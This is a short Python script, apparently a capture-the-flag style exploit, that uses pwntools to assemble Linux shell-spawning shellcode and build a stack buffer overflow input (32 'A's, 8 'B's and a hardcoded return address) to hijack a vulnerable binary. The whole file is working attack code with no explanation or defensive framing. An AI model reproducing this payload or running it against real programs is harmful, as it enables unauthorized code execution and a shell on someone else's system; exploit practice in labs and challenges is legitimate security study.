import pwn
import sys
pwn.context.arch = 'amd64'
shell = pwn.asm(pwn.shellcraft.linux.sh()) + '\n'
ret = '\x00\x00\x00\x00\x00\x40\x40\x70' [::-1]
init = 'A' * 32 + 'B' * 8 + ret+'\n'
payload = shell + init
print(payload)

